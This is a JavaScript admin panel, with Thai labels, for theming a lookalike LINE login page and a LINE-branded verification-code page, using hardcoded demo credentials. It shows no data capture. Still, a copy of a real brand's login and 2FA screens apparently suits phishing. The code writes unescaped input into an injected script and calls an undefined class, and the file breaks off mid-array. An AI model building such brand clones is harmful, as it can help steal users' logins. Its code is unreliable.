// Admin Panel JavaScript
class LineLoginAdmin {
    constructor() {
        this.defaultColors = {
            bgColor: '#1a1a1a',
            boxColor: '#2a2a2a',
            logoColor: '#00c300',
            inputBgColor: '#3a3a3a',
            inputBorderColor: '#555555',
            inputTextColor: '#ffffff',
            btnEnabledColor: '#00c851',
            btnDisabledColor: '#4a4a4a',
            textColor: '#ffffff',
            secondaryTextColor: '#aaaaaa',
            errorColor: '#ff4444',
            linkColor: '#4a9eff'
        };

        this.defaultTexts = {
            emailLabel: 'อีเมล',
            passwordLabel: 'รหัสผ่าน',
            loginBtnText: 'เข้าสู่ระบบ',
            qrBtnText: 'เข้าสู่ระบบด้วยคิวอาร์โค้ด',
            forgotText: 'ลืมรหัสผ่าน?',
            qrTitle: 'เข้าสู่ระบบด้วยคิวอาร์โค้ด',
            qrRefresh: '🔄 สร้างคิวอาร์โค้ดใหม่',
            backBtnText: 'เข้าสู่ระบบด้วยอีเมล'
        };

        this.defaultSettings = {
            validEmail: 'admin@line.com',
            validPassword: 'admin123',
            successMessage: 'เข้าสู่ระบบสำเร็จ!',
            errorMessage: 'อีเมลหรือรหัสผ่านไม่ถูกต้อง'
        };

        this.init();
    }

    init() {
        this.setupColorInputs();
        this.setupDividerControls();
        this.loadSavedSettings();
        this.setupEventListeners();
    }

    setupColorInputs() {
        // เชื่อมต่อ color picker กับ text input
        Object.keys(this.defaultColors).forEach(colorKey => {
            const colorInput = document.getElementById(colorKey);
            const textInput = document.getElementById(colorKey + 'Text');
            
            if (colorInput && textInput) {
                colorInput.addEventListener('input', (e) => {
                    textInput.value = e.target.value;
                });
                
                textInput.addEventListener('input', (e) => {
                    if (this.isValidHexColor(e.target.value)) {
                        colorInput.value = e.target.value;
                    }
                });
            }
        });
    }

    setupEventListeners() {
        // Auto-save เมื่อมีการเปลี่ยนแปลง
        document.addEventListener('input', () => {
            this.autoSave();
        });
    }

    isValidHexColor(hex) {
        return /^#([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})$/.test(hex);
    }

    loadSavedSettings() {
        // โหลดการตั้งค่าที่บันทึกไว้
        const savedColors = localStorage.getItem('lineLoginColors');
        const savedTexts = localStorage.getItem('lineLoginTexts');
        const savedSettings = localStorage.getItem('lineLoginSettings');

        if (savedColors) {
            const colors = JSON.parse(savedColors);
            Object.keys(colors).forEach(key => {
                const colorInput = document.getElementById(key);
                const textInput = document.getElementById(key + 'Text');
                if (colorInput) colorInput.value = colors[key];
                if (textInput) textInput.value = colors[key];
            });
        }

        if (savedTexts) {
            const texts = JSON.parse(savedTexts);
            Object.keys(texts).forEach(key => {
                const input = document.getElementById(key);
                if (input) input.value = texts[key];
            });
        }

        if (savedSettings) {
            const settings = JSON.parse(savedSettings);
            Object.keys(settings).forEach(key => {
                const input = document.getElementById(key);
                if (input) input.value = settings[key];
            });
        }
    }

    autoSave() {
        // บันทึกอัตโนมัติ
        setTimeout(() => {
            this.saveSettings();
        }, 1000);
    }

    saveSettings() {
        const colors = {};
        const texts = {};
        const settings = {};

        // เก็บสี
        Object.keys(this.defaultColors).forEach(key => {
            const input = document.getElementById(key + 'Text');
            if (input) colors[key] = input.value;
        });

        // เก็บข้อความ
        Object.keys(this.defaultTexts).forEach(key => {
            const input = document.getElementById(key);
            if (input) texts[key] = input.value;
        });

        // เก็บการตั้งค่า
        Object.keys(this.defaultSettings).forEach(key => {
            const input = document.getElementById(key);
            if (input) settings[key] = input.value;
        });

        localStorage.setItem('lineLoginColors', JSON.stringify(colors));
        localStorage.setItem('lineLoginTexts', JSON.stringify(texts));
        localStorage.setItem('lineLoginSettings', JSON.stringify(settings));
    }

    applyColors() {
        this.showLoading('กำลังใช้สีใหม่...');
        
        const colors = {};
        Object.keys(this.defaultColors).forEach(key => {
            const input = document.getElementById(key + 'Text');
            if (input) colors[key] = input.value;
        });

        this.updateLoginPage(colors, null, null);
        this.showSuccess('ใช้สีใหม่เรียบร้อยแล้ว!');
    }

    applyTexts() {
        this.showLoading('กำลังใช้ข้อความใหม่...');
        
        const texts = {};
        Object.keys(this.defaultTexts).forEach(key => {
            const input = document.getElementById(key);
            if (input) texts[key] = input.value;
        });

        this.updateLoginPage(null, texts, null);
        this.showSuccess('ใช้ข้อความใหม่เรียบร้อยแล้ว!');
    }

    applySettings() {
        this.showLoading('กำลังใช้การตั้งค่าใหม่...');
        
        const settings = {};
        Object.keys(this.defaultSettings).forEach(key => {
            const input = document.getElementById(key);
            if (input) settings[key] = input.value;
        });

        this.updateLoginPage(null, null, settings);
        this.showSuccess('ใช้การตั้งค่าใหม่เรียบร้อยแล้ว!');
    }

    updateLoginPage(colors, texts, settings) {
        // อัปเดตหน้าล็อกอิน
        const iframe = document.getElementById('previewFrame');
        if (iframe && iframe.contentDocument) {
            const doc = iframe.contentDocument;
            
            if (colors) {
                this.updateStyles(doc, colors);
            }
            
            if (texts) {
                this.updateTexts(doc, texts);
            }
            
            if (settings) {
                this.updateSettings(doc, settings);
            }
        }
        
        // บันทึกการเปลี่ยนแปลงลงไฟล์
        this.saveToFile(colors, texts, settings);
    }

    updateStyles(doc, colors) {
        let style = doc.getElementById('adminStyles');
        if (!style) {
            style = doc.createElement('style');
            style.id = 'adminStyles';
            doc.head.appendChild(style);
        }

        style.textContent = `
            body { background-color: ${colors.bgColor || this.defaultColors.bgColor} !important; }
            .login-container { background-color: ${colors.boxColor || this.defaultColors.boxColor} !important; }
            .logo h1 { color: ${colors.logoColor || this.defaultColors.logoColor} !important; }
            .form-group input { 
                background-color: ${colors.inputBgColor || this.defaultColors.inputBgColor} !important;
                border-color: ${colors.inputBorderColor || this.defaultColors.inputBorderColor} !important;
                color: ${colors.inputTextColor || this.defaultColors.inputTextColor} !important;
            }
            .login-btn.enabled { background-color: ${colors.btnEnabledColor || this.defaultColors.btnEnabledColor} !important; }
            .login-btn.disabled { background-color: ${colors.btnDisabledColor || this.defaultColors.btnDisabledColor} !important; }
            body, .form-group label { color: ${colors.textColor || this.defaultColors.textColor} !important; }
            .divider span, .qr-info p, .qr-refresh { color: ${colors.secondaryTextColor || this.defaultColors.secondaryTextColor} !important; }
            .form-group input.invalid { border-color: ${colors.errorColor || this.defaultColors.errorColor} !important; }
            .links a, .qr-links a { color: ${colors.linkColor || this.defaultColors.linkColor} !important; }
        `;
    }

    updateTexts(doc, texts) {
        // อัปเดตข้อความต่างๆ
        const elements = {
            'label[for="email"]': texts.emailLabel,
            'label[for="password"]': texts.passwordLabel,
            '#loginBtn': texts.loginBtnText,
            '#qrBtn': texts.qrBtnText,
            'a[href="#forgot"]': texts.forgotText,
            '.qr-title': texts.qrTitle,
            '.qr-refresh': texts.qrRefresh,
            '#backBtn': texts.backBtnText
        };

        Object.keys(elements).forEach(selector => {
            const element = doc.querySelector(selector);
            if (element && elements[selector]) {
                element.textContent = elements[selector];
            }
        });
    }

    updateSettings(doc, settings) {
        // อัปเดตการตั้งค่าการทำงาน
        const script = doc.createElement('script');
        script.textContent = `
            if (typeof validCredentials !== 'undefined') {
                validCredentials.email = '${settings.validEmail || this.defaultSettings.validEmail}';
                validCredentials.password = '${settings.validPassword || this.defaultSettings.validPassword}';
            }
        `;
        doc.head.appendChild(script);
    }

    async saveToFile(colors, texts, settings) {
        // บันทึกการเปลี่ยนแปลงลงไฟล์ index.html
        try {
            // ในการใช้งานจริง จะต้องมี API สำหรับบันทึกไฟล์
            console.log('Saving changes to file...', { colors, texts, settings });
        } catch (error) {
            console.error('Error saving to file:', error);
        }
    }

    resetColors() {
        Object.keys(this.defaultColors).forEach(key => {
            const colorInput = document.getElementById(key);
            const textInput = document.getElementById(key + 'Text');
            if (colorInput) colorInput.value = this.defaultColors[key];
            if (textInput) textInput.value = this.defaultColors[key];
        });
        this.applyColors();
    }

    resetTexts() {
        Object.keys(this.defaultTexts).forEach(key => {
            const input = document.getElementById(key);
            if (input) input.value = this.defaultTexts[key];
        });
        this.applyTexts();
    }

    resetSettings() {
        Object.keys(this.defaultSettings).forEach(key => {
            const input = document.getElementById(key);
            if (input) input.value = this.defaultSettings[key];
        });
        this.applySettings();
    }

    exportTheme() {
        const colors = {};
        const texts = {};
        const settings = {};

        Object.keys(this.defaultColors).forEach(key => {
            const input = document.getElementById(key + 'Text');
            if (input) colors[key] = input.value;
        });

        Object.keys(this.defaultTexts).forEach(key => {
            const input = document.getElementById(key);
            if (input) texts[key] = input.value;
        });

        Object.keys(this.defaultSettings).forEach(key => {
            const input = document.getElementById(key);
            if (input) settings[key] = input.value;
        });

        const theme = { colors, texts, settings };
        const dataStr = JSON.stringify(theme, null, 2);
        const dataBlob = new Blob([dataStr], { type: 'application/json' });
        
        const link = document.createElement('a');
        link.href = URL.createObjectURL(dataBlob);
        link.download = 'line-login-theme.json';
        link.click();
        
        this.showSuccess('ส่งออกธีมเรียบร้อยแล้ว!');
    }

    importTheme() {
        const input = document.createElement('input');
        input.type = 'file';
        input.accept = '.json';
        input.onchange = (e) => {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = (e) => {
                    try {
                        const theme = JSON.parse(e.target.result);
                        this.loadTheme(theme);
                        this.showSuccess('นำเข้าธีมเรียบร้อยแล้ว!');
                    } catch (error) {
                        this.showError('ไฟล์ธีมไม่ถูกต้อง!');
                    }
                };
                reader.readAsText(file);
            }
        };
        input.click();
    }

    loadTheme(theme) {
        if (theme.colors) {
            Object.keys(theme.colors).forEach(key => {
                const colorInput = document.getElementById(key);
                const textInput = document.getElementById(key + 'Text');
                if (colorInput) colorInput.value = theme.colors[key];
                if (textInput) textInput.value = theme.colors[key];
            });
        }

        if (theme.texts) {
            Object.keys(theme.texts).forEach(key => {
                const input = document.getElementById(key);
                if (input) input.value = theme.texts[key];
            });
        }

        if (theme.settings) {
            Object.keys(theme.settings).forEach(key => {
                const input = document.getElementById(key);
                if (input) input.value = theme.settings[key];
            });
        }

        this.applyColors();
        this.applyTexts();
        this.applySettings();
    }

    refreshPreview() {
        const iframe = document.getElementById('previewFrame');
        if (iframe) {
            iframe.src = iframe.src;
        }
        this.showSuccess('รีเฟรชตัวอย่างเรียบร้อยแล้ว!');
    }

    openInNewTab() {
        window.open('index.html', '_blank');
    }

    saveAll() {
        this.showLoading('กำลังบันทึกทั้งหมด...');
        this.saveSettings();
        this.applyColors();
        this.applyTexts();
        this.applySettings();
        this.showSuccess('บันทึกทั้งหมดเรียบร้อยแล้ว!');
    }

    showLoading(message) {
        // แสดงข้อความกำลังโหลด
        console.log('Loading:', message);
    }

    showSuccess(message) {
        // แสดงข้อความสำเร็จ
        this.showMessage(message, 'success');
    }

    showError(message) {
        // แสดงข้อความข้อผิดพลาด
        this.showMessage(message, 'error');
    }

    showMessage(message, type) {
        // สร้างและแสดงข้อความ
        const messageDiv = document.createElement('div');
        messageDiv.className = `${type}-message show`;
        messageDiv.textContent = message;
        
        document.body.appendChild(messageDiv);
        
        setTimeout(() => {
            messageDiv.remove();
        }, 3000);
    }
}

// Global Functions
function applyColors() {
    window.adminPanel.applyColors();
}

function applyTexts() {
    window.adminPanel.applyTexts();
}

function applySettings() {
    window.adminPanel.applySettings();
}

function resetColors() {
    window.adminPanel.resetColors();
}

function resetTexts() {
    window.adminPanel.resetTexts();
}

function resetSettings() {
    window.adminPanel.resetSettings();
}

function exportTheme() {
    window.adminPanel.exportTheme();
}

function importTheme() {
    window.adminPanel.importTheme();
}

function refreshPreview() {
    window.adminPanel.refreshPreview();
}

function openInNewTab() {
    window.adminPanel.openInNewTab();
}

function saveAll() {
    window.adminPanel.saveAll();
}

// Initialize Admin Panel
document.addEventListener('DOMContentLoaded', () => {
    window.adminPanel = new LineLoginAdmin();
});


// Divider Functions
function applyDividers() {
    window.adminPanel.applyDividers();
}

function resetDividers() {
    window.adminPanel.resetDividers();
}

// เพิ่มฟังก์ชันใน AdminPanel class
AdminPanel.prototype.setupDividerControls = function() {
    // Setup range sliders
    const ranges = ['dividerThickness', 'dividerSpacing', 'dividerTextPadding', 'dividerFontSize'];
    ranges.forEach(id => {
        const slider = document.getElementById(id);
        const valueSpan = document.getElementById(id + 'Value');
        if (slider && valueSpan) {
            slider.addEventListener('input', () => {
                valueSpan.textContent = slider.value + 'px';
            });
        }
    });

    // Setup color inputs
    const colorInputs = ['dividerColor', 'dividerTextColor'];
    colorInputs.forEach(id => {
        const colorInput = document.getElementById(id);
        const textInput = document.getElementById(id + 'Text');
        if (colorInput && textInput) {
            colorInput.addEventListener('change', () => {
                textInput.value = colorInput.value;
            });
            textInput.addEventListener('change', () => {
                if (this.isValidHex(textInput.value)) {
                    colorInput.value = textInput.value;
                }
            });
        }
    });
};

AdminPanel.prototype.applyDividers = function() {
    const dividerColor = document.getElementById('dividerColor').value;
    const dividerTextColor = document.getElementById('dividerTextColor').value;
    const dividerThickness = document.getElementById('dividerThickness').value;
    const dividerSpacing = document.getElementById('dividerSpacing').value;
    const dividerTextPadding = document.getElementById('dividerTextPadding').value;
    const dividerFontSize = document.getElementById('dividerFontSize').value;
    const showDividers = document.getElementById('showDividers').checked;

    const css = `
        :root {
            --divider-color: ${dividerColor};
            --divider-text-color: ${dividerTextColor};
            --divider-thickness: ${dividerThickness}px;
            --divider-spacing: ${dividerSpacing}px;
            --divider-text-padding: ${dividerTextPadding}px;
            --divider-font-size: ${dividerFontSize}px;
            --divider-display: ${showDividers ? 'block' : 'none'};
        }
    `;

    this.injectCSS(css, 'divider-styles');
    this.showSuccess('ใช้การตั้งค่าเส้นแบ่งเรียบร้อยแล้ว!');
};

AdminPanel.prototype.resetDividers = function() {
    document.getElementById('dividerColor').value = '#555555';
    document.getElementById('dividerColorText').value = '#555555';
    document.getElementById('dividerTextColor').value = '#aaaaaa';
    document.getElementById('dividerTextColorText').value = '#aaaaaa';
    document.getElementById('dividerThickness').value = '1';
    document.getElementById('dividerThicknessValue').textContent = '1px';
    document.getElementById('dividerSpacing').value = '20';
    document.getElementById('dividerSpacingValue').textContent = '20px';
    document.getElementById('dividerTextPadding').value = '15';
    document.getElementById('dividerTextPaddingValue').textContent = '15px';
    document.getElementById('dividerFontSize').value = '14';
    document.getElementById('dividerFontSizeValue').textContent = '14px';
    document.getElementById('showDividers').checked = true;

    this.applyDividers();
    this.showSuccess('รีเซ็ตการตั้งค่าเส้นแบ่งเรียบร้อยแล้ว!');
};


// Size and Proportion Control Functions

function updateBoxSize() {
    const boxWidth = document.getElementById('boxWidth').value;
    const boxHeight = document.getElementById('boxHeight').value;
    const boxPadding = document.getElementById('boxPadding').value;
    const boxRadius = document.getElementById('boxRadius').value;
    
    // Update slider value displays
    const boxWidthSlider = document.getElementById('boxWidth').parentElement;
    const boxHeightSlider = document.getElementById('boxHeight').parentElement;
    const boxPaddingSlider = document.getElementById('boxPadding').parentElement;
    const boxRadiusSlider = document.getElementById('boxRadius').parentElement;
    
    boxWidthSlider.querySelector('.slider-value').textContent = boxWidth + 'px';
    boxHeightSlider.querySelector('.slider-value').textContent = boxHeight + 'px';
    boxPaddingSlider.querySelector('.slider-value').textContent = boxPadding + 'px';
    boxRadiusSlider.querySelector('.slider-value').textContent = boxRadius + 'px';
    
    // Apply to preview
    const previewFrame = document.getElementById('previewFrame');
    if (previewFrame && previewFrame.contentDocument) {
        const loginContainer = previewFrame.contentDocument.querySelector('.login-container');
        if (loginContainer) {
            loginContainer.style.setProperty('--box-width', boxWidth + 'px');
            loginContainer.style.setProperty('--box-height', boxHeight + 'px');
            loginContainer.style.setProperty('--box-padding', boxPadding + 'px');
            loginContainer.style.setProperty('--box-radius', boxRadius + 'px');
        }
    }
}

function updateFontSizes() {
    const mainHeadingSize = document.getElementById('mainHeadingSize').value;
    const subHeadingSize = document.getElementById('subHeadingSize').value;
    const bodyTextSize = document.getElementById('bodyTextSize').value;
    const buttonTextSize = document.getElementById('buttonTextSize').value;
    
    // Update slider value displays
    const mainHeadingSlider = document.getElementById('mainHeadingSize').parentElement;
    const subHeadingSlider = document.getElementById('subHeadingSize').parentElement;
    const bodyTextSlider = document.getElementById('bodyTextSize').parentElement;
    const buttonTextSlider = document.getElementById('buttonTextSize').parentElement;
    
    mainHeadingSlider.querySelector('.slider-value').textContent = mainHeadingSize + 'px';
    subHeadingSlider.querySelector('.slider-value').textContent = subHeadingSize + 'px';
    bodyTextSlider.querySelector('.slider-value').textContent = bodyTextSize + 'px';
    buttonTextSlider.querySelector('.slider-value').textContent = buttonTextSize + 'px';
    
    // Apply to preview
    const previewFrame = document.getElementById('previewFrame');
    if (previewFrame && previewFrame.contentDocument) {
        const loginContainer = previewFrame.contentDocument.querySelector('.login-container');
        if (loginContainer) {
            loginContainer.style.setProperty('--main-heading-size', mainHeadingSize + 'px');
            loginContainer.style.setProperty('--sub-heading-size', subHeadingSize + 'px');
            loginContainer.style.setProperty('--body-text-size', bodyTextSize + 'px');
            loginContainer.style.setProperty('--button-text-size', buttonTextSize + 'px');
        }
    }
}

function updateQRSize() {
    const qrCodeSize = document.getElementById('qrCodeSize').value;
    const qrPadding = document.getElementById('qrPadding').value;
    
    // Update slider value displays
    const qrCodeSlider = document.getElementById('qrCodeSize').parentElement;
    const qrPaddingSlider = document.getElementById('qrPadding').parentElement;
    
    qrCodeSlider.querySelector('.slider-value').textContent = qrCodeSize + 'px';
    qrPaddingSlider.querySelector('.slider-value').textContent = qrPadding + 'px';
    
    // Apply to preview
    const previewFrame = document.getElementById('previewFrame');
    if (previewFrame && previewFrame.contentDocument) {
        const loginContainer = previewFrame.contentDocument.querySelector('.login-container');
        if (loginContainer) {
            loginContainer.style.setProperty('--qr-code-size', qrCodeSize + 'px');
            loginContainer.style.setProperty('--qr-padding', qrPadding + 'px');
        }
    }
}

function updateSpacing() {
    const elementSpacing = document.getElementById('elementSpacing').value;
    const inputHeight = document.getElementById('inputHeight').value;
    const buttonHeight = document.getElementById('buttonHeight').value;
    
    // Update slider value displays
    const elementSpacingSlider = document.getElementById('elementSpacing').parentElement;
    const inputHeightSlider = document.getElementById('inputHeight').parentElement;
    const buttonHeightSlider = document.getElementById('buttonHeight').parentElement;
    
    elementSpacingSlider.querySelector('.slider-value').textContent = elementSpacing + 'px';
    inputHeightSlider.querySelector('.slider-value').textContent = inputHeight + 'px';
    buttonHeightSlider.querySelector('.slider-value').textContent = buttonHeight + 'px';
    
    // Apply to preview
    const previewFrame = document.getElementById('previewFrame');
    if (previewFrame && previewFrame.contentDocument) {
        const loginContainer = previewFrame.contentDocument.querySelector('.login-container');
        if (loginContainer) {
            loginContainer.style.setProperty('--element-spacing', elementSpacing + 'px');
            loginContainer.style.setProperty('--input-height', inputHeight + 'px');
            loginContainer.style.setProperty('--button-height', buttonHeight + 'px');
        }
    }
}

function applySizeSettings() {
    // Collect all size settings
    const sizeSettings = {
        boxWidth: document.getElementById('boxWidth').value,
        boxHeight: document.getElementById('boxHeight').value,
        boxPadding: document.getElementById('boxPadding').value,
        boxRadius: document.getElementById('boxRadius').value,
        mainHeadingSize: document.getElementById('mainHeadingSize').value,
        subHeadingSize: document.getElementById('subHeadingSize').value,
        bodyTextSize: document.getElementById('bodyTextSize').value,
        buttonTextSize: document.getElementById('buttonTextSize').value,
        qrCodeSize: document.getElementById('qrCodeSize').value,
        qrPadding: document.getElementById('qrPadding').value,
        elementSpacing: document.getElementById('elementSpacing').value,
        inputHeight: document.getElementById('inputHeight').value,
        buttonHeight: document.getElementById('buttonHeight').value
    };
    
    // Save to localStorage
    localStorage.setItem('lineSizeSettings', JSON.stringify(sizeSettings));
    
    // Apply all settings
    updateBoxSize();
    updateFontSizes();
    updateQRSize();
    updateSpacing();
    
    // Update main index.html file with CSS variables
    updateMainFileWithSizeSettings(sizeSettings);
    
    alert('✅ การตั้งค่าขนาดและสัดส่วนถูกนำไปใช้แล้ว!');
}

function resetSizeSettings() {
    if (confirm('ต้องการรีเซ็ตการตั้งค่าขนาดและสัดส่วนทั้งหมดหรือไม่?')) {
        // Reset to default values
        document.getElementById('boxWidth').value = 400;
        document.getElementById('boxHeight').value = 500;
        document.getElementById('boxPadding').value = 40;
        document.getElementById('boxRadius').value = 15;
        document.getElementById('mainHeadingSize').value = 28;
        document.getElementById('subHeadingSize').value = 14;
        document.getElementById('bodyTextSize').value = 14;
        document.getElementById('buttonTextSize').value = 16;
        document.getElementById('qrCodeSize').value = 200;
        document.getElementById('qrPadding').value = 20;
        document.getElementById('elementSpacing').value = 20;
        document.getElementById('inputHeight').value = 50;
        document.getElementById('buttonHeight').value = 50;
        
        // Update displays and apply
        updateBoxSize();
        updateFontSizes();
        updateQRSize();
        updateSpacing();
        
        // Remove from localStorage
        localStorage.removeItem('lineSizeSettings');
        
        alert('✅ การตั้งค่าขนาดและสัดส่วนถูกรีเซ็ตแล้ว!');
    }
}

function exportSizeSettings() {
    const sizeSettings = {
        boxWidth: document.getElementById('boxWidth').value,
        boxHeight: document.getElementById('boxHeight').value,
        boxPadding: document.getElementById('boxPadding').value,
        boxRadius: document.getElementById('boxRadius').value,
        mainHeadingSize: document.getElementById('mainHeadingSize').value,
        subHeadingSize: document.getElementById('subHeadingSize').value,
        bodyTextSize: document.getElementById('bodyTextSize').value,
        buttonTextSize: document.getElementById('buttonTextSize').value,
        qrCodeSize: document.getElementById('qrCodeSize').value,
        qrPadding: document.getElementById('qrPadding').value,
        elementSpacing: document.getElementById('elementSpacing').value,
        inputHeight: document.getElementById('inputHeight').value,
        buttonHeight: document.getElementById('buttonHeight').value,
        exportDate: new Date().toISOString()
    };
    
    const dataStr = JSON.stringify(sizeSettings, null, 2);
    const dataBlob = new Blob([dataStr], {type: 'application/json'});
    const url = URL.createObjectURL(dataBlob);
    
    const link = document.createElement('a');
    link.href = url;
    link.download = 'line-login-size-settings.json';
    link.click();
    
    URL.revokeObjectURL(url);
    alert('📤 การตั้งค่าขนาดและสัดส่วนถูกส่งออกแล้ว!');
}

function updateMainFileWithSizeSettings(settings) {
    // Update the preview frame with CSS variables
    const previewFrame = document.getElementById('previewFrame');
    if (previewFrame && previewFrame.contentDocument) {
        let style = previewFrame.contentDocument.getElementById('size-settings-style');
        if (!style) {
            style = previewFrame.contentDocument.createElement('style');
            style.id = 'size-settings-style';
            previewFrame.contentDocument.head.appendChild(style);
        }
        
        style.textContent = `
            :root {
                --box-width: ${settings.boxWidth}px;
                --box-height: ${settings.boxHeight}px;
                --box-padding: ${settings.boxPadding}px;
                --box-radius: ${settings.boxRadius}px;
                --main-heading-size: ${settings.mainHeadingSize}px;
                --sub-heading-size: ${settings.subHeadingSize}px;
                --body-text-size: ${settings.bodyTextSize}px;
                --button-text-size: ${settings.buttonTextSize}px;
                --qr-code-size: ${settings.qrCodeSize}px;
                --qr-padding: ${settings.qrPadding}px;
                --element-spacing: ${settings.elementSpacing}px;
                --input-height: ${settings.inputHeight}px;
                --button-height: ${settings.buttonHeight}px;
            }
            
            .login-container {
                width: var(--box-width) !important;
                min-height: var(--box-height) !important;
                padding: var(--box-padding) !important;
                border-radius: var(--box-radius) !important;
            }
            
            .logo {
                font-size: var(--main-heading-size) !important;
            }
            
            .subtitle {
                font-size: var(--sub-heading-size) !important;
            }
            
            .form-group label,
            .form-group input,
            .divider-text {
                font-size: var(--body-text-size) !important;
            }
            
            .login-btn,
            .qr-btn {
                font-size: var(--button-text-size) !important;
                height: var(--button-height) !important;
            }
            
            .form-group input {
                height: var(--input-height) !important;
            }
            
            .form-group {
                margin-bottom: var(--element-spacing) !important;
            }
            
            .qr-code {
                width: var(--qr-code-size) !important;
                height: var(--qr-code-size) !important;
                margin: var(--qr-padding) auto !important;
            }
        `;
    }
}

// Load saved size settings on page load
function loadSizeSettings() {
    const savedSettings = localStorage.getItem('lineSizeSettings');
    if (savedSettings) {
        const settings = JSON.parse(savedSettings);
        
        // Apply saved values to sliders
        Object.keys(settings).forEach(key => {
            const element = document.getElementById(key);
            if (element) {
                element.value = settings[key];
            }
        });
        
        // Update displays
        updateBoxSize();
        updateFontSizes();
        updateQRSize();
        updateSpacing();
    }
}


// ==================== VERIFICATION PAGE FUNCTIONS ====================

// Apply verification page settings
function applyVerificationSettings() {
    const settings = {
        texts: {
            lineTitle: document.getElementById('verificationTitle').value,
            verificationHeading: document.getElementById('verificationHeading').value,
            verificationDescription: document.getElementById('verificationDescription').value,
            codeDisplay: document.getElementById('verificationCode').value,
            infoText: document.getElementById('infoText').value,
            alternativeLink: document.getElementById('alternativeLinkText').value
        },
        colors: {
            'bg-color': document.getElementById('verificationBgColor').value,
            'container-bg': document.getElementById('verificationContainerBg').value,
            'line-green': document.getElementById('verificationLineGreen').value,
            'text-primary': document.getElementById('verificationTextPrimary').value,
            'text-secondary': document.getElementById('verificationTextSecondary').value,
            'link-color': document.getElementById('verificationLinkColor').value,
            'code-bg': document.getElementById('verificationCodeBg').value,
            'code-border': document.getElementById('verificationCodeBorder').value
        },
        sizes: {
            'container-width': parseInt(document.getElementById('verificationContainerWidth').value),
            'container-padding': parseInt(document.getElementById('verificationContainerPadding').value),
            'border-radius': parseInt(document.getElementById('verificationBorderRadius').value),
            'font-size-title': parseInt(document.getElementById('verificationFontSizeTitle').value),
            'font-size-heading': parseInt(document.getElementById('verificationFontSizeHeading').value),
            'font-size-code': parseInt(document.getElementById('verificationFontSizeCode').value),
            'spacing-sections': parseInt(document.getElementById('verificationSpacingSections').value),
            'code-padding': parseInt(document.getElementById('verificationCodePadding').value)
        },
        verificationCode: document.getElementById('verificationCode').value,
        timerMinutes: parseInt(document.getElementById('timerMinutes').value),
        alternativeUrl: document.getElementById('alternativeUrl').value
    };
    
    // Save to localStorage
    localStorage.setItem('verificationSettings', JSON.stringify(settings));
    
    // Update preview if verification page is currently shown
    const previewFrame = document.getElementById('previewFrame');
    if (previewFrame && previewFrame.src.includes('verification.html')) {
        refreshPreview();
    }
    
    alert('🔐 การตั้งค่าหน้ายืนยันตัวตนถูกบันทึกแล้ว!');
}

// Reset verification page settings
function resetVerificationSettings() {
    if (confirm('คุณต้องการรีเซ็ตการตั้งค่าหน้ายืนยันตัวตนเป็นค่าเริ่มต้นหรือไม่?')) {
        // Reset form values
        document.getElementById('verificationTitle').value = 'LINE';
        document.getElementById('verificationHeading').value = 'รหัสยืนยันตัวตน';
        document.getElementById('verificationDescription').value = 'กรุณากรอกรหัสยืนยันที่ได้รับทาง LINE อย่างน้อย 4 หลัก';
        document.getElementById('verificationCode').value = '6085';
        document.getElementById('timerMinutes').value = '3';
        document.getElementById('infoText').value = 'ไม่ได้รับรหัสยืนยันผ่าน LINE<br>สำหรับเฉพาะท่านใหม่';
        document.getElementById('alternativeLinkText').value = 'เข้าสู่ระบบด้วยวิธีอื่น';
        document.getElementById('alternativeUrl').value = 'index.html';
        
        // Reset colors
        document.getElementById('verificationBgColor').value = '#1a1a1a';
        document.getElementById('verificationContainerBg').value = '#2a2a2a';
        document.getElementById('verificationLineGreen').value = '#00c851';
        document.getElementById('verificationTextPrimary').value = '#ffffff';
        document.getElementById('verificationTextSecondary').value = '#cccccc';
        document.getElementById('verificationLinkColor').value = '#4285f4';
        document.getElementById('verificationCodeBg').value = '#333333';
        document.getElementById('verificationCodeBorder').value = '#555555';
        
        // Reset sizes and update sliders
        const sizeInputs = [
            { id: 'verificationContainerWidth', value: 400 },
            { id: 'verificationContainerPadding', value: 40 },
            { id: 'verificationBorderRadius', value: 15 },
            { id: 'verificationFontSizeTitle', value: 32 },
            { id: 'verificationFontSizeHeading', value: 24 },
            { id: 'verificationFontSizeCode', value: 48 },
            { id: 'verificationSpacingSections', value: 30 },
            { id: 'verificationCodePadding', value: 20 }
        ];
        
        sizeInputs.forEach(input => {
            const element = document.getElementById(input.id);
            if (element) {
                element.value = input.value;
                const valueDisplay = element.nextElementSibling;
                if (valueDisplay && valueDisplay.classList.contains('slider-value')) {
                    valueDisplay.textContent = input.value + 'px';
                }
            }
        });
        
        // Update color input text fields
        updateVerificationColorInputs();
        
        // Remove saved settings
        localStorage.removeItem('verificationSettings');
        
        alert('🔄 การตั้งค่าหน้ายืนยันตัวตนถูกรีเซ็ตแล้ว!');
    }
}

// Preview verification page
function previewVerification() {
    switchPreview('verification.html');
}

// Switch preview between pages
function switchPreview(page) {
    const previewFrame = document.getElementById('previewFrame');
    const tabButtons = document.querySelectorAll('.tab-btn');
    
    // Update iframe source
    previewFrame.src = page;
    
    // Update active tab
    tabButtons.forEach(btn => btn.classList.remove('active'));
    const activeTab = Array.from(tabButtons).find(btn => 
        btn.textContent.includes(page === 'verification.html' ? 'ยืนยัน' : 'ล็อกอิน')
    );
    if (activeTab) {
        activeTab.classList.add('active');
    }
}

// Update verification color input text fields
function updateVerificationColorInputs() {
    const colorInputs = [
        'verificationBgColor', 'verificationContainerBg', 'verificationLineGreen',
        'verificationTextPrimary', 'verificationTextSecondary', 'verificationLinkColor',
        'verificationCodeBg', 'verificationCodeBorder'
    ];
    
    colorInputs.forEach(id => {
        const colorInput = document.getElementById(id);
        if (colorInput) {
            const textInput = colorInput.nextElementSibling;
            if (textInput && textInput.type === 'text') {
                textInput.value = colorInput.value;
            }
        }
    });
}

// Setup verification page controls
function setupVerificationControls() {
    // Setup color input synchronization
    const colorInputs = [
        'verificationBgColor', 'verificationContainerBg', 'verificationLineGreen',
        'verificationTextPrimary', 'verificationTextSecondary', 'verificationLinkColor',
        'verificationCodeBg', 'verificationCodeBorder'
    ];
    
    colorInputs.forEach(id => {
        const colorInput = document.getElementById(id);
        const textInput = colorInput?.nextElementSibling;
        
        if (colorInput && textInput) {
            // Sync color picker to text input
            colorInput.addEventListener('input', function() {
                textInput.value = this.value;
            });
            
            // Sync text input to color picker
            textInput.addEventListener('input', function() {
                if (/^#[0-9A-F]{6}$/i.test(this.value)) {
                    colorInput.value = this.value;
                }
            });
        }
    });
    
    // Setup size slider controls
    const sizeInputs = [
